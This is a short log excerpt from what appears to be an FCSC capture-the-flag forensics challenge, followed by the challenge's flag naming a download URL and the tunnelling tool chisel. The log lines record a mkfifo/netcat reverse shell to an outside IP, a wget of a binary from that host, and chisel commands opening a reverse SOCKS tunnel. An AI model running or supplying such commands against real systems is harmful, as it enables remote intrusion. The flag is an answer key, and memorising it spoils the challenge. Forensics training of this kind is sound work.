```text
20230613T085501.log: /bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 80.125.9.58 50012 >/tmp/f"
20230613T085501.log: nc 80.125.9.58 50012
20230613T085501.log: wget http://80.125.9.58:80/text
20230613T085501.log: sudo ./text client -v 80.125.9.58:4444 R:socks
20230613T085501.log: sudo ./text client -v 80.125.9.58:4444 R:socks
20230613T085501.log: ./text client -v 80.125.9.58:4444 R:socks
```

FCSC{http://80.125.9.58:80/text:chisel}